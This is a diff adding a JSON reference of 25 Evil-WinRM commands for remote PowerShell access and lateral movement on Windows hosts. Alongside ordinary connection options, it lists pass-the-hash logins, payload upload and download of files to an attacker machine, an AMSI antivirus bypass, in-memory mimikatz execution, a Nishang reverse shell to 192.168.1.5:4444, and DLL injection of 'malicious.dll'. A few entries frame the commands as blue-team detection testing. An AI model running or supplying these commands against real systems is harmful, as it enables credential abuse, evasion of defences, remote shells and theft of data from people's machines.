@@ -1,0 +1,182 @@
+{
+    "tool": "evil-winrm",
+    "description": "Complete Evil-WinRM command and workflow reference from basic to advanced remote PowerShell execution and lateral movement",
+    "total_commands": 25,
+    "commands": [
+        {
+            "id": 1,
+            "category": "Basic Remote Connection",
+            "command": "evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!'",
+            "example": "evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!'",
+            "explanation": "Establishes a basic interactive WinRM PowerShell session using plaintext credentials."
+        },
+        {
+            "id": 2,
+            "category": "Authentication Handling",
+            "command": "evil-winrm -i 192.168.1.10 -u Administrator -H '32132132132132132132132132132132'",
+            "example": "evil-winrm -i 192.168.1.10 -u Administrator -H '32132132132132132132132132132132'",
+            "explanation": "Performs a Pass-the-Hash attack using an NTLM hash instead of a password."
+        },
+        {
+            "id": 3,
+            "category": "Transport Security",
+            "command": "evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -S",
+            "example": "evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -S",
+            "explanation": "Enables SSL encryption to connect via WinRM over HTTPS (default port 5986)."
+        },
+        {
+            "id": 4,
+            "category": "Target Specification",
+            "command": "evil-winrm -i 192.168.1.10 -P 5985 -u Administrator -p 'Password123!'",
+            "example": "evil-winrm -i 192.168.1.10 -P 5985 -u Administrator -p 'Password123!'",
+            "explanation": "Specifies a custom port for the WinRM connection, overriding defaults."
+        },
+        {
+            "id": 5,
+            "category": "Advanced Authentication",
+            "command": "evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -r CONTOSO.COM",
+            "example": "evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -r CONTOSO.COM",
+            "explanation": "Specifies the domain realm for authentication, useful in Kerberos environments."
+        },
+        {
+            "id": 6,
+            "category": "Key-Based Authentication",
+            "command": "evil-winrm -i 192.168.1.10 -c public_key.pem -k private_key.pem -S",
+            "example": "evil-winrm -i 192.168.1.10 -c public_key.pem -k private_key.pem -S",
+            "explanation": "Authenticates using a client certificate key pair over an SSL encrypted connection."
+        },
+        {
+            "id": 7,
+            "category": "Script & Module Loading",
+            "command": "evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -s /opt/scripts",
+            "example": "evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -s /opt/scripts",
+            "explanation": "Loads a local directory of PowerShell scripts into the session for easy execution."
+        },
+        {
+            "id": 8,
+            "category": "Executable Loading",
+            "command": "evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -e /opt/exes",
+            "example": "evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -e /opt/exes",
+            "explanation": "Loads a local directory of executables (ISVs) for in-memory execution."
+        },
+        {
+            "id": 9,
+            "category": "Output & Logging",
+            "command": "evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -l",
+            "example": "evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -l",
+            "explanation": "Enables logging to save session output to files for later analysis."
+        },
+        {
+            "id": 10,
+            "category": "Interactive File Transfer",
+            "command": "upload /local/path/payload.exe C:\\Windows\\Temp\\payload.exe",
+            "example": "upload /local/path/payload.exe C:\\Windows\\Temp\\payload.exe",
+            "explanation": "Uploads a file from the attacker machine to the remote target within the session."
+        },
+        {
+            "id": 11,
+            "category": "Interactive File Transfer",
+            "command": "download C:\\Windows\\Temp\\sensitive.docx /local/path/sensitive.docx",
+            "example": "download C:\\Windows\\Temp\\sensitive.docx /local/path/sensitive.docx",
+            "explanation": "Downloads a file from the remote target to the attacker machine within the session."
+        },
+        {
+            "id": 12,
+            "category": "Defense Evasion",
+            "command": "Bypass-4MSI",
+            "example": "Bypass-4MSI",
+            "explanation": "Executes the built-in AMSI bypass command to disable antivirus scanning for the session."
+        },
+        {
+            "id": 13,
+            "category": "Interactive Session Handling",
+            "command": "menu",
+            "example": "menu",
+            "explanation": "Displays the loaded scripts and modules available for execution in the current session."
+        },
+        {
+            "id": 14,
+            "category": "Lateral Movement Simulation",
+            "command": "Invoke-Binary /opt/exes/mimikatz.exe",
+            "example": "Invoke-Binary /opt/exes/mimikatz.exe",
+            "explanation": "Executes a loaded binary directly in memory using Invoke-Binary to avoid disk writes."
+        },
+        {
+            "id": 15,
+            "category": "Service Execution",
+            "command": "evil-winrm -i 192.168.1.10 -u Administrator -H 'NTLM_HASH' -S",
+            "example": "evil-winrm -i 192.168.1.10 -u Administrator -H 'NTLM_HASH' -S",
+            "explanation": "Combines Pass-the-Hash with SSL for a secure, authenticated lateral movement channel."
+        },
+        {
+            "id": 16,
+            "category": "URL-Based Connection",
+            "command": "evil-winrm -i https://example.com:5986/wsman -u Administrator -p 'Password123!'",
+            "example": "evil-winrm -i https://example.com:5986/wsman -u Administrator -p 'Password123!'",
+            "explanation": "Connects to a specific WinRM URL endpoint, useful for complex network routings."
+        },
+        {
+            "id": 17,
+            "category": "Operational Security",
+            "command": "evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -N",
+            "example": "evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -N",
+            "explanation": "Disables color output, useful for scripting or terminals that do not support ANSI colors."
+        },
+        {
+            "id": 18,
+            "category": "PowerShell Script Execution",
+            "command": "Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.5 -Port 4444",
+            "example": "Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.5 -Port 4444",
+            "explanation": "Executes a loaded PowerShell script (e.g., Nishang) from the menu to trigger a callback."
+        },
+        {
+            "id": 19,
+            "category": "Enumeration Workflow",
+            "command": "evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -s /opt/privesc_checks",
+            "example": "evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -s /opt/privesc_checks",
+            "explanation": "Starts a session pre-loaded with privilege escalation enumeration scripts for rapid auditing."
+        },
+        {
+            "id": 20,
+            "category": "Incident Response Test",
+            "command": "evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -l",
+            "example": "evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -l",
+            "explanation": "Simulates an attack while logging all activity to verify blue team log correlation capabilities."
+        },
+        {
+            "id": 21,
+            "category": "Dll Injection Workflow",
+            "command": "Dll-Loader -path C:\\Windows\\Temp\\malicious.dll",
+            "example": "Dll-Loader -path C:\\Windows\\Temp\\malicious.dll",
+            "explanation": "Uses the built-in Donut-based loader to inject a DLL into a process (requires loaded module)."
+        },
+        {
+            "id": 22,
+            "category": "Interactive Service Control",
+            "command": "sc.exe query cmdservice",
+            "example": "sc.exe query cmdservice",
+            "explanation": "Standard Windows command execution within the Evil-WinRM shell to query service status."
+        },
+        {
+            "id": 23,
+            "category": "Blue Team Detection",
+            "command": "evil-winrm -i 192.168.1.10 -u Administrator -H '321...321' -s /opt/atomic_red_team",
+            "example": "evil-winrm -i 192.168.1.10 -u Administrator -H '321...321' -s /opt/atomic_red_team",
+            "explanation": "Loads Atomic Red Team scripts to validate detection logic against specific TTPs."
+        },
+        {
+            "id": 24,
+            "category": "Remote Host Cleanup",
+            "command": "Remove-Item -Path C:\\Windows\\Temp\\* -Force",
+            "example": "Remove-Item -Path C:\\Windows\\Temp\\* -Force",
+            "explanation": "PowerShell command run within the session to clean up artifacts after simulation."
+        },
+        {
+            "id": 25,
+            "category": "Exit & Termination",
+            "command": "exit",
+            "example": "exit",
+            "explanation": "Cleanly terminates the WinRM session and closes the connection to the remote host."
+        }
+    ]
+}
